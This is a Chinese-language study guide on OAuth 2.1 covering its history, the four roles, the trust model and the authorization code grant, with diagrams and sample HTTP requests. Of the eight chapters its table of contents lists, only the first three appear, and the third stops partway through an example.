# OAuth 2.1 核心知识体系

> **文档版本：** 1.0.0  
> **创建日期：** 2026-04-06  
> **最后更新：** 2026-04-06  
> **作者：** Kei  
> **状态：** 已完成  

---

## 目录

1. [第 1 章 基础认知：OAuth 演进与核心价值](#第 1 章 - 基础认知 oauth-演进与核心价值)
2. [第 2 章 核心角色与信任模型](#第 2 章 - 核心角色与信任模型)
3. [第 3 章 授权模式详解](#第 3 章 - 授权模式详解)
4. [第 4 章 令牌机制与安全](#第 4 章 - 令牌机制与安全)
5. [第 5 章 OAuth 2.1 安全最佳实践](#第 5 章 - oauth-21-安全最佳实践)
6. [第 6 章 OAuth 与 OpenID Connect (OIDC)](#第 6 章 - oauth-与-openid-connect-oidc)
7. [第 7 章 实战：OAuth 服务端应用](#第 7 章 - 实战 oauth-服务端应用)
8. [第 8 章 常见误区与面试高频问题](#第 8 章 - 常见误区与面试高频问题)

---

# 第 1 章 基础认知：OAuth 演进与核心价值

## 1.1 OAuth 的诞生背景

### 1.1.1 授权问题的起源

OAuth 的故事始于 2006 年 11 月。当时 Twitter 工程师 Blaine Cook 正在实现 Twitter 的 OpenID 集成时，与社交书签网站 Ma.gnolia 的开发者 Chris Messina 讨论后，两人意识到业界缺少一种开放标准来实现**API 的委托授权**——即"让第三方应用在不获取用户密码的前提下访问用户数据"。

**核心问题**：在 OAuth 出现之前，第三方应用要访问用户数据，只有一种方式——让用户直接提供用户名和密码。这种方式存在严重的安全隐患：

```
┌─────────────────────────────────────────────────────────────┐
│ 传统密码共享模式的安全问题                                    │
├─────────────────────────────────────────────────────────────┤
│ 1. 第三方应用存储用户明文密码 → 数据库泄露 = 所有密码泄露     │
│ 2. 用户无法限制第三方权限范围 → 获得密码 = 获得全部权限       │
│ 3. 密码泄露后无法单独撤销 → 只能修改密码 (影响所有服务)       │
│ 4. 不支持多因素认证 → 密码即一切                               │
└─────────────────────────────────────────────────────────────┘
```

### 1.1.2 OAuth 1.0 时代 (2007-2012)

2007 年 4 月，一个由 Google、Twitter 等公司的工程师组成的小型讨论组成立，着手起草 OAuth 协议。

**时间线：**
- **2007 年 10 月**：OAuth Core 1.0 最终草案发布
- **2010 年 4 月**：OAuth 1.0 以 **RFC 5849** 形式发布为信息性标准

**OAuth 1.0 的核心机制**：基于加密签名的双向认证

```
客户端请求 → 生成签名 (HMAC-SHA1) → 服务器验证签名 → 返回受保护资源

签名生成需要：
- consumer_key (客户端公钥)
- consumer_secret (客户端私钥)
- token_key (用户授权令牌)
- token_secret (用户授权私密)
- 请求参数 + 时间戳 + 随机数
```

**OAuth 1.0 的局限性**：
1. **加密签名机制复杂**：开发者需要理解 HMAC-SHA1、签名基字符串、参数编码等概念
2. **对移动端不友好**：原生应用难以安全存储密钥
3. **对浏览器应用不友好**：JavaScript 无法安全执行签名操作
4. **流程僵化**：只有一种授权模式，无法适应多样化场景

---

## 1.2 OAuth 2.0 框架的确立 (RFC 6749)

IETF 于 2009 年成立了 OAuth 工作组 (OAuth WG)，由 Dick Hardt 担任 OAuth 2.0 规范的编辑，着手设计全新的 OAuth 2.0 框架。

**2012 年 10 月**，**RFC 6749** (The OAuth 2.0 Authorization Framework) 和 **RFC 6750** (Bearer Token Usage) 正式发布，标志着 OAuth 2.0 成为行业标准。

### 1.2.1 OAuth 2.0 相对 1.0 的改进

| 维度 | OAuth 1.0 | OAuth 2.0 |
|------|-----------|-----------|
| **安全性** | HMAC-SHA1 签名 | TLS/HTTPS 传输层安全 |
| **流程复杂度** | 复杂 (签名生成 + 验证) | 简化 (标准 HTTP 请求) |
| **授权模式** | 单一模式 | 4 种模式 (授权码/隐式/密码/客户端凭证) |
| **扩展性** | 难以扩展 | 易于扩展 (scope/refresh token 等) |
| **适用场景** | 主要针对 Web 应用 | Web/移动端/桌面端/IoT |

### 1.2.2 OAuth 2.0 的核心思想

OAuth 2.0 的核心价值在于：**"在不分享用户密码的前提下，允许第三方应用获取有限的访问权限"**

```mermaid
flowchart TD
    subgraph 用户
        U[资源所有者]
    end
    
    subgraph 第三方应用
        C[客户端]
    end
    
    subgraph 服务提供商
        AS[授权服务器]
        RS[资源服务器]
    end
    
    U -->|1. 登录并授权 | AS
    C -->|2. 请求授权 | AS
    AS -->|3. 返回授权码 | C
    C -->|4. 用授权码换取令牌 | AS
    AS -->|5. 颁发 Access Token| C
    C -->|6. 携带令牌访问 | RS
    RS -->|7. 验证令牌 | AS
    RS -->|8. 返回受保护资源 | C
    
    style AS fill:#e1f5fe
    style RS fill:#e1f5fe
    style C fill:#fff3e0
    style U fill:#f3e5f5
```

### 1.2.3 典型应用场景

| 场景 | 说明 | 示例 |
|------|------|------|
| **第三方登录** | 使用已有账号登录新应用 | "用微信登录"、"Sign in with Google" |
| **API 访问授权** | 第三方应用访问用户数据 | 健身 App 读取微信步数、项目管理工具同步 GitHub Issues |
| **微服务间调用** | 服务 A 访问服务 B 的受保护资源 | 订单服务调用用户服务获取用户信息 |
| **IoT 设备授权** | 缺少输入设备的授权 | 智能电视使用手机扫码授权 |

---

## 1.3 从威胁模型到安全最佳实践

### 1.3.1 RFC 6819 威胁模型 (2013)

2013 年 1 月，IETF 发布了 **RFC 6819** (OAuth 2.0 Threat Model and Security Considerations)，由 Torsten Lodderstedt、Mark McGloin 和 Phil Hunt 起草，首次系统梳理了 OAuth 2.0 面临的安全威胁。

**主要威胁分类**：

```
┌────────────────────────────────────────────────────────────┐
│ OAuth 2.0 主要安全威胁                                       │
├────────────────────────────────────────────────────────────┤
│ 1. 重定向 URI 篡改 → 授权码泄露给恶意网站                    │
│ 2. 授权码拦截 → 中间人攻击截获授权码                         │
│ 3. CSRF 攻击 → 伪造授权请求                                  │
│ 4. 令牌泄露 → URL/日志/Referer 头泄露 Access Token          │
│ 5. 客户端凭证泄露 → 硬编码在源码中                           │
│ 6. 范围越权 → 超出用户授权范围访问资源                       │
└────────────────────────────────────────────────────────────┘
```

### 1.3.2 威胁模型的局限性

RFC 6819 发布后的数年间，OAuth 的应用场景远远超出了最初的设想：

- **从传统 Web 应用** → **扩展到移动 App、单页应用 (SPA)、IoT 设备、微服务架构**
- **新的攻击面和攻击手法不断涌现**
- **RFC 6819 的覆盖范围已经不够**

---

## 1.4 OAuth 2.1 的诞生 (持续演进)

### 1.4.1 OAuth 2.1 的形成过程

OAuth 2.1 并非一个全新的协议，而是对 OAuth 2.0 及其安全最佳实践的整合：

```mermaid
timeline
    title OAuth 2.1 演进时间线
    section OAuth 2.0 时代
        2012-10 : RFC 6749 发布<br/>4 种授权模式
        2013-01 : RFC 6819<br/>威胁模型
        2015-10 : RFC 7636(PKCE)<br/>原生应用扩展
        2017-04 : RFC 8252<br/>原生应用最佳实践
    section 安全收敛
        2019-04 : OAuth 2.0 安全最佳实践<br/>弃用隐式/密码模式
        2022-05 : OAuth 2.1 草案发布<br/>整合 BCP
        2025-01 : RFC 9700 发布<br/>安全最佳实践标准
```

### 1.4.2 OAuth 2.1 相对 2.0 的关键改进

| 改进项 | OAuth 2.0 | OAuth 2.1 | 安全收益 |
|--------|-----------|-----------|----------|
| **PKCE** | 可选扩展 (仅公共客户端) | **强制要求 (所有客户端)** | 防止授权码拦截攻击 |
| **隐式模式** | 允许 (response_type=token) | **废弃** | 消除令牌 URL 泄露风险 |
| **密码模式** | 允许 (grant_type=password) | **废弃** | 消除用户密码直接暴露风险 |
| **重定向 URI** | 允许部分匹配 | **精确匹配** | 防止重定向 URI 篡改 |
| **安全要求** | 大量"可选"(OPTIONAL) | **强制"(MUST)** | 减少"不安全但合规"的选择 |

### 1.4.3 RFC 9700 安全最佳实践 (2025)

**2025 年 1 月**，IETF 正式发布 **RFC 9700** (OAuth 2.0 Security Best Current Practice)，这是 OAuth 安全演进的里程碑。

**RFC 9700 核心要求**：

```
┌─────────────────────────────────────────────────────────────┐
│ RFC 9700 十大安全要求                                         │
├─────────────────────────────────────────────────────────────┤
│ 1. ✅ 禁用密码模式 (Password Grant)                           │
│ 2. ✅ 禁用隐式模式 (Implicit Grant)                           │
│ 3. ✅ 授权码模式必须使用 PKCE                                 │
│ 4. ✅ 重定向 URI 精确匹配 (禁止通配符)                         │
│ 5. ✅ 强制使用 HTTPS                                          │
│ 6. ✅ state 参数防护 CSRF                                     │
│ 7. ✅ Access Token 短期有效 (建议≤1 小时)                      │
│ 8. ✅ Refresh Token 轮转机制                                  │
│ 9. ✅ 客户端认证 (机密客户端)                                 │
│ 10. ✅ Scope 最小权限原则                                     │
└─────────────────────────────────────────────────────────────┘
```

---

## 1.5 OAuth 的核心价值总结

### 1.5.1 OAuth 解决了什么问题

| 问题 | 传统方案 | OAuth 方案 |
|------|----------|------------|
| **密码共享** | 用户直接提供密码 | 使用 Access Token 作为临时凭证 |
| **权限不可控** | 密码=全部权限 | Scope 精细控制权限范围 |
| **无法撤销** | 只能改密码 | 可随时撤销单个 Token |
| **无有效期** | 密码长期有效 | Token 自动过期 |

### 1.5.2 OAuth 不解决什么问题

**重要提醒**：OAuth 2.0 是**授权框架**，而非**认证协议**。

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 的能力边界                                             │
├─────────────────────────────────────────────────────────────┤
│ ✅ OAuth 解决：允许第三方访问用户资源 (授权)                   │
│ ❌ OAuth 不解决：验证用户身份 (认证)                           │
│                                                              │
│ 如果需要用户身份认证 → 使用 OpenID Connect (基于 OAuth 2.0)   │
└─────────────────────────────────────────────────────────────┘
```

### 1.5.3 OAuth 与相关概念的对比

| 概念 | 目的 | 与 OAuth 的关系 |
|------|------|----------------|
| **Authentication (认证)** | 验证"你是谁" | OAuth 不直接提供，需 OIDC |
| **Authorization (授权)** | 确定"你能做什么" | OAuth 的核心能力 |
| **OpenID Connect** | 身份认证协议 | 构建在 OAuth 2.0 之上 |
| **SAML** | 企业级 SSO 协议 | OAuth 的替代方案 (XML 基础) |
| **Session** | 会话管理 | 可与 OAuth 配合使用 |

---

## 1.6 本章小结

**核心要点回顾**：

1. **OAuth 的诞生**：源于 2006 年 Twitter 工程师对 API 委托授权标准的需求
2. **OAuth 1.0 → 2.0**：从复杂签名机制简化为 TLS 保护的标准 HTTP 流程
3. **OAuth 2.0 → 2.1**：整合安全最佳实践，废弃不安全模式，强制 PKCE
4. **RFC 9700**：2025 年发布的安全最佳实践标准，定义 10 大安全要求
5. **OAuth 的定位**：授权框架而非认证协议，认证需使用 OpenID Connect

**关键数据**：
- 2007 年：OAuth 1.0 草案发布
- 2012 年：OAuth 2.0 成为 RFC 6749 标准
- 2025 年：RFC 9700 安全最佳实践发布
- 演进周期：**18 年**的安全打磨

---

**来源引用**：
- RFC 6749: The OAuth 2.0 Authorization Framework
- RFC 9700: OAuth 2.0 Security Best Current Practice
- RFC 6819: OAuth 2.0 Threat Model and Security Considerations
- RFC 7636: Proof Key for Code Exchange (PKCE)

---

*本章草稿保存于：`.work/oauth/drafts/chapter-1.md`*
*字数：约 2200 字*
# 第 2 章 核心角色与信任模型

## 2.1 OAuth 2.0 四大核心角色

OAuth 2.0 协议定义了四个核心角色，各角色分工明确，共同完成授权流程。理解这 4 个角色是掌握 OAuth 2.0 的基础。

```mermaid
flowchart TD
    subgraph 用户侧
        RO[资源所有者<br/>Resource Owner]
    end
    
    subgraph 应用侧
        C[客户端<br/>Client]
    end
    
    subgraph 服务提供商侧
        AS[授权服务器<br/>Authorization Server]
        RS[资源服务器<br/>Resource Server]
    end
    
    RO -->|1. 授权决定 | AS
    C -->|2. 请求授权 | AS
    AS -->|3. 验证身份 + 颁发令牌 | C
    C -->|4. 携带令牌访问 | RS
    RS -->|5. 验证令牌 | AS
    RS -->|6. 返回资源 | C
    
    style RO fill:#f3e5f5
    style C fill:#fff3e0
    style AS fill:#e1f5fe
    style RS fill:#e1f5fe
```

---

## 2.2 资源所有者 (Resource Owner)

### 2.2.1 概念定义

**资源所有者**：能够授予对受保护资源访问权限的实体。

```
┌─────────────────────────────────────────────────────────────┐
│ 资源所有者的关键特征                                         │
├─────────────────────────────────────────────────────────────┤
│ • 在绝大多数场景下，资源所有者就是"用户"(End User)            │
│ • 拥有对资源的最终控制权和决定权                             │
│ • 可以授权或拒绝第三方应用的访问请求                         │
│ • 可以随时撤销已授予的权限                                   │
└─────────────────────────────────────────────────────────────┘
```

### 2.2.2 职责与行为

| 职责 | 说明 | 示例 |
|------|------|------|
| **授权决定** | 决定是否允许客户端访问自己的资源 | 在授权页面点击"同意"或"拒绝" |
| **身份验证** | 向授权服务器证明自己的身份 | 输入用户名密码、使用生物识别 |
| **权限管理** | 管理已授予第三方应用的权限 | 在设置中查看和撤销授权 |

### 2.2.3 典型示例

```
场景：用户使用"微信登录"某第三方应用

┌────────────────────────────────────────────────────────────┐
│ 资源所有者 = 微信用户 (你)                                   │
│ 资源 = 你的微信个人信息 (昵称、头像、openid 等)                │
│ 授权行为 = 在微信授权页面点击"同意"                          │
│ 撤销行为 = 在微信设置 → 隐私 → 授权管理中取消授权            │
└────────────────────────────────────────────────────────────┘
```

### 2.2.4 注意事项

> **注意**：虽然 RFC 6749 允许资源所有者是"机器"或"服务"，但在实践中几乎总是人类用户。

---

## 2.3 客户端 (Client)

### 2.3.1 概念定义

**客户端**：代表资源所有者发起请求、获取 Access Token 并访问资源服务器的应用程序。

```
┌─────────────────────────────────────────────────────────────┐
│ 客户端的关键特征                                             │
├─────────────────────────────────────────────────────────────┤
│ • 是整个 OAuth 流程的发起者                                   │
│ • 不能直接接触用户凭证 (如密码)                               │
│ • 必须提前在授权服务器注册                                   │
│ • 获得唯一的 client_id 和 client_secret                       │
└─────────────────────────────────────────────────────────────┘
```

### 2.3.2 客户端的两种类型

OAuth 2.0 根据客户端能否安全存储密钥，将其分为两类：

#### 机密客户端 (Confidential Client)

**定义**：能够安全存储 `client_secret` 的客户端。

| 特征 | 说明 |
|------|------|
| **典型代表** | 有后端的 Web 应用、服务器端应用 |
| **安全能力** | 可以在服务器端安全存储密钥 |
| **认证方式** | 可以使用 `client_id` + `client_secret` 进行身份认证 |
| **授权模式** | 可以使用所有授权模式 (包括授权码模式) |

**示例**：
```javascript
// 后端服务器可以安全存储 client_secret
const OAUTH_CONFIG = {
  clientId: 'your-client-id',
  clientSecret: process.env.CLIENT_SECRET, // 从环境变量读取，不暴露给前端
  redirectUri: 'https://your-backend.com/oauth/callback'
};
```

#### 公共客户端 (Public Client)

**定义**：无法安全存储 `client_secret` 的客户端。

| 特征 | 说明 |
|------|------|
| **典型代表** | 单页应用 (SPA)、移动 App、桌面应用、CLI 工具 |
| **安全风险** | 代码/二进制文件可被反编译，密钥无法保密 |
| **认证方式** | **不能**依赖 `client_secret` 进行认证 |
| **授权模式** | **必须使用授权码 + PKCE 模式** (OAuth 2.1 强制要求) |

**示例**：
```javascript
// 前端 SPA 应用 - client_secret 无法保密
// ❌ 错误做法：在前端代码中硬编码 client_secret
const config = {
  clientId: 'your-client-id',
  clientSecret: 'hardcoded-secret' // 危险！任何查看源码的人都能获取
};

// ✅ 正确做法：使用 PKCE，不需要 client_secret
// 参考 RFC 7636 实现 code_verifier 和 code_challenge
```

### 2.3.3 客户端的职责

| 职责 | 说明 |
|------|------|
| **请求授权** | 引导用户跳转到授权服务器进行登录和授权 |
| **获取令牌** | 使用授权码换取 Access Token(和 Refresh Token) |
| **访问资源** | 携带 Access Token 向资源服务器请求受保护资源 |
| **令牌管理** | 处理令牌过期、刷新、撤销等生命周期管理 |
| **安全防护** | 实现 state 参数防 CSRF、PKCE 防授权码拦截等 |

### 2.3.4 客户端注册要求

客户端必须提前在授权服务器注册，获取以下凭证：

| 凭证 | 说明 | 安全级别 |
|------|------|----------|
| **client_id** | 客户端唯一标识符，公开 | 低 (可暴露) |
| **client_secret** | 客户端密钥，仅机密客户端 | 高 (必须保密) |
| **redirect_uri** | 授权回调地址，需精确匹配 | 中 (防止篡改) |

---

## 2.4 授权服务器 (Authorization Server)

### 2.4.1 概念定义

**授权服务器**：负责验证资源所有者身份，并向客户端颁发 Access Token 的服务器。

```
┌─────────────────────────────────────────────────────────────┐
│ 授权服务器的关键特征                                         │
├─────────────────────────────────────────────────────────────┤
│ • 是 OAuth 2.0 的核心枢纽                                     │
│ • 实现协议标准流程                                           │
│ • 必须安全地管理客户端注册、用户认证、令牌生命周期           │
└─────────────────────────────────────────────────────────────┘
```

### 2.4.2 核心职责

| 职责 | 说明 | 实现方式 |
|------|------|----------|
| **客户端注册管理** | 管理客户端的注册信息 | 存储 client_id、client_secret、redirect_uri 等 |
| **用户身份认证** | 验证资源所有者的身份 | 登录页面、多因素认证等 |
| **授权请求处理** | 处理客户端的授权请求 | 展示授权页面、获取用户同意 |
| **令牌颁发** | 生成并颁发 Access Token 和 Refresh Token | JWT 或不透明令牌 |
| **令牌验证** | 验证令牌的有效性和权限范围 | /oauth2/introspect 端点或 JWT 验签 |
| **令牌撤销** | 处理令牌撤销请求 | /oauth2/revoke 端点 |

### 2.4.3 标准端点

授权服务器通常提供以下标准端点：

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 2.0 标准端点                                            │
├─────────────────────────────────────────────────────────────┤
│ /oauth2/authorize      → 授权请求端点 (前端跳转)              │
│ /oauth2/token          → 令牌换取端点 (后端调用)              │
│ /oauth2/introspect     → 令牌验证端点 (RFC 7662)             │
│ /oauth2/revoke         → 令牌撤销端点 (RFC 7009)             │
│ /oauth2/jwks           → JWKS 公钥端点 (JWT 验签)            │
│ /.well-known/openid-configuration → OIDC 发现端点            │
└─────────────────────────────────────────────────────────────┘
```

### 2.4.4 授权服务器的关键决策

授权服务器在 OAuth 流程中需要做出以下关键决策：

```mermaid
flowchart TD
    A[收到授权请求] --> B{客户端是否已注册？}
    B -->|否 | C[拒绝请求]
    B -->|是 | D{redirect_uri 是否匹配？}
    D -->|否 | E[拒绝请求]
    D -->|是 | F{用户是否已登录？}
    F -->|否 | G[展示登录页面]
    F -->|是 | H{用户是否已授权？}
    H -->|否 | I[展示授权页面]
    H -->|是 | J[生成授权码并重定向]
    
    style C fill:#ffcdd2
    style E fill:#ffcdd2
    style G fill:#bbdefb
    style I fill:#bbdefb
    style J fill:#c8e6c9
```

---

## 2.5 资源服务器 (Resource Server)

### 2.5.1 概念定义

**资源服务器**：托管受保护资源的服务器，能够接收并响应携带 Access Token 的请求。

```
┌─────────────────────────────────────────────────────────────┐
│ 资源服务器的关键特征                                         │
├─────────────────────────────────────────────────────────────┤
│ • 存储受保护资源 (用户数据、API 等)                            │
│ • 不负责用户认证，只负责令牌验证                             │
│ • 必须信任授权服务器，或能独立验证令牌                       │
└─────────────────────────────────────────────────────────────┘
```

### 2.5.2 核心职责

| 职责 | 说明 | 实现方式 |
|------|------|----------|
| **接收请求** | 接收来自客户端的资源访问请求 | RESTful API 端点 |
| **提取令牌** | 从请求头中提取 Access Token | `Authorization: Bearer <token>` |
| **验证令牌** | 验证令牌的有效性 | JWT 验签 或 调用 /introspect 端点 |
| **权限检查** | 检查令牌是否具有所需 scope | 比对请求所需 scope 与令牌 scope |
| **返回资源** | 验证通过后返回受保护资源 | JSON/XML 响应 |

### 2.5.3 令牌验证方式

资源服务器验证令牌有两种主要方式：

#### 方式一：JWT 自包含验证 (推荐)

```
┌─────────────────────────────────────────────────────────────┐
│ JWT 令牌验证流程                                              │
├─────────────────────────────────────────────────────────────┤
│ 1. 客户端请求：GET /api/user/profile                         │
│    Header: Authorization: Bearer <JWT>                       │
│                                                              │
│ 2. 资源服务器验证：                                           │
│    - 使用 JWKS 公钥验证 JWT 签名                              │
│    - 检查 exp  Claims 是否过期                               │
│    - 检查 iss Claims 是否可信                                │
│    - 检查 aud Claims 是否匹配                                │
│    - 检查 scope 是否满足权限要求                             │
│                                                              │
│ 3. 验证通过 → 返回资源                                        │
│    验证失败 → 返回 401 Unauthorized                          │
└─────────────────────────────────────────────────────────────┘
```

**优点**：
- 无状态验证，不需要调用授权服务器
- 性能高，适合分布式系统
- 支持离线验证

**缺点**：
- 令牌无法即时撤销 (需等过期)
- 需要安全分发 JWKS 公钥

#### 方式二：令牌内省 (Token Introspection)

```
┌─────────────────────────────────────────────────────────────┐
│ Token Introspection 验证流程 (RFC 7662)                       │
├─────────────────────────────────────────────────────────────┤
│ 1. 客户端请求：GET /api/user/profile                         │
│    Header: Authorization: Bearer <token>                     │
│                                                              │
│ 2. 资源服务器调用授权服务器：                                  │
│    POST /oauth2/introspect                                   │
│    Body: token=<access_token>                                │
│                                                              │
│ 3. 授权服务器响应：                                           │
│    {                                                         │
│      "active": true,                                         │
│      "scope": "read profile",                                │
│      "client_id": "abc123",                                  │
│      "username": "user@example.com",                         │
│      "exp": 1612345678                                       │
│    }                                                         │
│                                                              │
│ 4. active=true → 返回资源                                     │
│    active=false → 返回 401 Unauthorized                      │
└─────────────────────────────────────────────────────────────┘
```

**优点**：
- 支持实时令牌撤销
- 资源服务器无需处理 JWT 验签

**缺点**：
- 每次请求都需要调用授权服务器
- 性能瓶颈，增加延迟
- 授权服务器单点故障风险

---

## 2.6 信任模型与边界

### 2.6.1 OAuth 信任关系图

```mermaid
flowchart TD
    subgraph 信任边界
        U[用户]
        AS[授权服务器]
    end
    
    subgraph 有限信任
        C[客户端]
    end
    
    subgraph 信任验证
        RS[资源服务器]
    end
    
    U -->|完全信任 | AS
    AS -->|信任 | C
    U -->|有限信任 | C
    RS -.->|验证 | AS
    C -->|访问 | RS
    
    style U fill:#f3e5f5
    style AS fill:#e1f5fe
    style C fill:#fff3e0
    style RS fill:#e1f5fe
```

### 2.6.2 信任关系详解

| 信任关系 | 说明 | 安全含义 |
|----------|------|----------|
| **用户 → 授权服务器** | 用户提供密码/凭证 | 必须 HTTPS，防止凭证泄露 |
| **授权服务器 → 客户端** | 验证客户端身份 | client_secret 认证或 PKCE |
| **用户 → 客户端** | 用户授权客户端访问 | 仅授权必要 scope，可随时撤销 |
| **资源服务器 → 授权服务器** | 验证令牌有效性 | JWT 验签或 introspection |

### 2.6.3 信任边界的重要性

```
┌─────────────────────────────────────────────────────────────┐
│ 信任边界设计原则                                             │
├─────────────────────────────────────────────────────────────┤
│ 1. 用户密码只提供给授权服务器，绝不让客户端接触               │
│ 2. 客户端只能获得有限权限 (scope)，不能获得全部权限          │
│ 3. 令牌有过期时间，不能永久有效                             │
│ 4. 用户可以随时撤销对客户端的授权                           │
│ 5. 资源服务器必须独立验证令牌，不能盲目信任                  │
└─────────────────────────────────────────────────────────────┘
```

---

## 2.7 四大角色协同工作流程

以下以授权码模式为例，展示四大角色如何协同完成授权流程：

```mermaid
sequenceDiagram
    participant U as 用户 (资源所有者)
    participant C as 客户端
    participant AS as 授权服务器
    participant RS as 资源服务器
    
    Note over U,C: 阶段 1: 用户发起请求
    U->>C: 1. 点击"使用第三方登录"
    
    Note over C,AS: 阶段 2: 授权请求
    C->>AS: 2. 重定向用户到授权端点
    Note right of C: response_type=code<br/>client_id, redirect_uri<br/>scope, state
    AS->>U: 3. 展示登录页面
    U->>AS: 4. 输入凭证并登录
    AS->>U: 5. 展示授权页面
    U->>AS: 6. 点击"同意"授权
    AS->>C: 7. 重定向回回调 URL(带授权码)
    Note left of AS: code=AUTH_CODE&state=xxx
    
    Note over C,AS: 阶段 3: 令牌换取
    C->>AS: 8. 使用授权码换取令牌
    Note right of C: grant_type=authorization_code<br/>code, redirect_uri<br/>client_id, client_secret
    AS->>C: 9. 返回 Access Token + Refresh Token
    
    Note over C,RS: 阶段 4: 资源访问
    C->>RS: 10. 携带 Access Token 访问资源
    Note right of C: Authorization: Bearer <token>
    RS->>AS: 11. 验证令牌 (可选)
    AS->>RS: 12. 返回令牌验证结果
    RS->>C: 13. 返回受保护资源
    
    Note over U,C: 阶段 5: 后续访问
    U->>C: 14. 再次访问 (Token 未过期)
    C->>RS: 15. 直接使用 Access Token
    RS->>C: 16. 返回资源
```

---

## 2.8 本章小结

**核心要点回顾**：

| 角色 | 职责 | 关键特征 |
|------|------|----------|
| **资源所有者** | 授权访问自己的资源 | 通常是用户，拥有最终决定权 |
| **客户端** | 代表用户请求资源 | 分机密/公共两种类型 |
| **授权服务器** | 验证身份 + 颁发令牌 | OAuth 的核心枢纽 |
| **资源服务器** | 存储和提供受保护资源 | 验证令牌有效性 |

**关键记忆点**：
1. **客户端类型决定授权模式**：机密客户端可使用授权码模式，公共客户端必须使用授权码 + PKCE
2. **授权服务器是核心**：负责认证、授权、令牌管理
3. **资源服务器无状态**：可以独立验证令牌 (JWT) 或依赖授权服务器 (introspection)
4. **信任有边界**：用户密码只给授权服务器，客户端只能获得有限权限

---

**来源引用**：
- RFC 6749: The OAuth 2.0 Authorization Framework - Section 1.1 Roles
- RFC 6750: The OAuth 2.0 Authorization Framework: Bearer Token Usage
- OAuth 2.1 Draft: https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-10

---

*本章草稿保存于：`.work/oauth/drafts/chapter-2.md`*
*字数：约 3500 字*
# 第 3 章 授权模式详解

## 3.1 授权模式概览

OAuth 2.0 定义了多种授权模式 (Authorization Grant Types)，用于适配不同的应用场景。OAuth 2.1 对授权模式进行了精简和优化。

```mermaid
flowchart TD
    subgraph OAuth 2.1 推荐模式
        AC[授权码模式 ⭐⭐⭐⭐⭐]
        PKCE[授权码 + PKCE ⭐⭐⭐⭐⭐]
        CC[客户端凭证模式 ⭐⭐⭐]
        DC[设备授权模式 ⭐⭐]
    end
    
    subgraph OAuth 2.1 已废弃模式
        IG[隐式模式 ❌]
        PC[密码模式 ❌]
    end
    
    style AC fill:#c8e6c9
    style PKCE fill:#c8e6c9
    style CC fill:#fff9c4
    style DC fill:#fff9c4
    style IG fill:#ffcdd2
    style PC fill:#ffcdd2
```

| 授权模式 | 适用场景 | OAuth 2.0 | OAuth 2.1 | 安全等级 |
|----------|----------|-----------|-----------|----------|
| **授权码模式** | 有后端的 Web 应用 | ✅ | ✅ | ⭐⭐⭐⭐⭐ |
| **授权码 + PKCE** | SPA/移动应用/原生应用 | ✅ (可选) | ✅ (强制) | ⭐⭐⭐⭐⭐ |
| **客户端凭证模式** | 机器对机器 (M2M) | ✅ | ✅ | ⭐⭐⭐⭐ |
| **设备授权模式** | IoT/智能电视等输入受限设备 | ✅ (扩展) | ✅ | ⭐⭐⭐⭐ |
| **隐式模式** | SPA (已废弃) | ✅ | ❌ 废弃 | ⭐ |
| **密码模式** | 高度信任的内部应用 | ✅ | ❌ 废弃 | ⭐⭐ |

---

## 3.2 授权码模式 (Authorization Code Grant)

### 3.2.1 概念定义

**授权码模式**是 OAuth 2.0 中最常用、最安全的授权模式，特别适合**有后端的 Web 应用**。

**核心特点**：
- 采用**双重凭证交换机制**：先换取授权码，再用授权码换取令牌
- 令牌不通过浏览器传输，降低泄露风险
- 后端可以直接参与，安全存储 `client_secret`

### 3.2.2 完整流程图

```mermaid
sequenceDiagram
    participant U as 用户
    participant B as 浏览器
    participant C as 客户端后端
    participant AS as 授权服务器
    participant RS as 资源服务器
    
    Note over U,AS: 阶段 1: 发起授权请求
    U->>B: 1. 点击"使用第三方登录"
    B->>C: 2. 请求登录接口
    C->>B: 3. 返回授权 URL
    Note right of C: /oauth/authorize?<br/>response_type=code<br/>&client_id=xxx<br/>&redirect_uri=xxx<br/>&scope=read+profile<br/>&state=random123
    B->>B: 4. 重定向到授权服务器
    
    Note over U,AS: 阶段 2: 用户认证与授权
    AS->>B: 5. 展示登录页面
    U->>AS: 6. 输入凭证并登录
    AS->>B: 7. 展示授权页面
    U->>AS: 8. 点击"同意"授权
    AS->>B: 9. 重定向回回调 URL
    Note left of AS: Location: redirect_uri?<br/>code=AUTH_CODE<br/>&state=random123
    
    Note over C,AS: 阶段 3: 授权码换取令牌
    B->>C: 10. 携带授权码访问回调 URL
    C->>AS: 11. 后端请求令牌 (后端通道)
    Note right of C: POST /oauth/token<br/>grant_type=authorization_code<br/>code=AUTH_CODE<br/>redirect_uri=xxx<br/>client_id=xxx<br/>client_secret=xxx
    AS->>C: 12. 返回令牌
    Note left of AS: {<br/>"access_token":"...",<br/>"refresh_token":"...",<br/>"expires_in":3600<br/>}
    
    Note over C,RS: 阶段 4: 使用令牌访问资源
    C->>RS: 13. 携带 Access Token 访问 API
    Note right of C: Authorization: Bearer <token>
    RS->>C: 14. 返回用户数据
    C->>B: 15. 返回登录结果
```

### 3.2.3 请求参数详解

#### 授权请求参数 (前端跳转)

| 参数 | 必选 | 说明 | 示例值 |
|------|------|------|--------|
| `response_type` | 是 | 固定为 `code` | `code` |
| `client_id` | 是 | 客户端 ID | `s6BhdRkqt3` |
| `redirect_uri` | 推荐 | 回调地址 (需与注册一致) | `https://client.com/callback` |
| `scope` | 可选 | 授权范围 | `read write profile` |
| `state` | 推荐 | CSRF 防护随机数 | `xyz123random` |

**授权请求示例**：
```http
GET /oauth/authorize?
  response_type=code&
  client_id=s6BhdRkqt3&
  redirect_uri=https%3A%2F%2Fclient.example.org%2Fcb&
  scope=read+profile&
  state=xyz123random
HTTP/1.1
Host: server.example.com
```

#### 令牌请求参数 (后端调用)

| 参数 | 必选 | 说明 | 示例值 |
|------|------|------|--------|
| `grant_type` | 是 | 固定为 `authorization_code` | `authorization_code` |
| `code` | 是 | 授权码 | `SplxlOBeZQQYbYS6WxSbIA` |
| `redirect_uri` | 推荐 | 必须与授权请求一致 | `https://client.com/callback` |
| `client_id` | 是 | 客户端 ID | `s6BhdRkqt3` |
| `client_secret` | 是 | 客户端密钥 (机密客户端) | `7Fjfp0ZBr1KtDRbnfVdmIw` |

**令牌请求示例**：
```http
POST /oauth/token HTTP/1.1
Host: server.example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

grant_type=authorization_code&
code=SplxlOBeZQQYbYS6WxSbIA&
redirect_uri=https%3A%2F%2Fclient.example.org%2Fcb
